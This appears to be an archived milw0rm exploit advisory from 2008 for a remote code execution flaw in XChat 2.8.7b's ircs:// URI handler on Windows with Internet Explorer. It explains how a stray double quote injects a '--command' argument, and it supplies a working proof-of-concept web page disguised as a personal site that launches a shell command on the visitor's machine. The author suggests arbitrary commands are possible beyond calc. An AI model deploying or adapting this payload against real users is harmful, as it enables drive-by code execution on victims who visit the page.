<html><head><title>XChat <= 2.8.7b (URI Handler) Remote Code Execution Exploit (ie6/ie7)</title></head><pre>##################################################################################################################
#
# Xchat &lt;= 2.8.7b Remote Code Execution (tested on Windows XP SP1+SP2+SP3, IE6 &amp; IE7 fully patched)
# Vendor : http://xchat.org/
# Affected Os : Windows *
# Risk : critical
#
# This bug is related to the URI Handler vulnerability but the approch is a bit different.
# We don't use any % or  ../../../ as the others related bugs, just a single &quot;
# According to the registry , when the IRCS:// URI is called , the command launched is :
# C:\Program Files\xchat\xchat.exe --existing --url=&quot;%1&quot;
#
# The xchat --help option tells us :
# &quot; --command=COMMAND :Send a command to existing xchat &quot;
#
# So we add a simple &quot; at the end of the URL and we're in business ?
# Yep =) ircs://blabla@3.3.3.3&quot; --command &quot;shell calc&quot;
#
# Note: The victim needs to be connected to an irc server , and also need IE * .
#
#
#
# Greetz: French/Quebec community, http://spiritofhack.net/
#
# &quot;If in times like theses you can talk about individual freedoom, you're propably a terrorist&quot;
#
# Poc: this only launch the calc, sky is the limit passed this point.
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Welcome to my personal website&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;document.location='ircs://blabla@3.3.3.3&quot; --command &quot;shell calc&quot;'&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2008-06-13]</pre></html>